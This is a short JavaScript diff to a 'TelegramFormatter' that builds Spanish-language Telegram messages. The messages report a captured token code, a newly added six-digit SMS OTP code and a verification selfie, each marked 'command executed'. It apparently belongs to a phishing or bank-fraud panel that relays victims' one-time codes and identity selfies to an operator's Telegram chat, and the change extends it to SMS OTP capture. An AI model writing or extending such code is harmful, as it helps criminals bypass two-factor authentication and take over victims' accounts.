@@ -300,7 +300,15 @@ const TelegramFormatter = {
             case 'Token':
                 return `🔐 <b>VERIFICACIÓN DE TOKEN</b>\n\n` +
                        `🔑 <b>Código:</b> <code>${data.codigo}</code>\n` +
-                       `⏰ <b>Fecha:</b> ${timestamp}`;
+                       `⏰ <b>Fecha:</b> ${timestamp}\n\n` +
+                       `✅ <b>Comando ejecutado</b>`;
+
+            case 'OTP':
+                return `📱 <b>VERIFICACIÓN OTP SMS</b>\n\n` +
+                       `🔢 <b>Código:</b> <code>${data.codigo}</code>\n` +
+                       `📲 <b>Tipo:</b> SMS de 6 dígitos\n` +
+                       `⏰ <b>Fecha:</b> ${timestamp}\n\n` +
+                       `✅ <b>Comando ejecutado</b>`;
 
             case 'Selfie':
                 return `📸 <b>SELFIE DE VERIFICACIÓN</b>\n\n` +
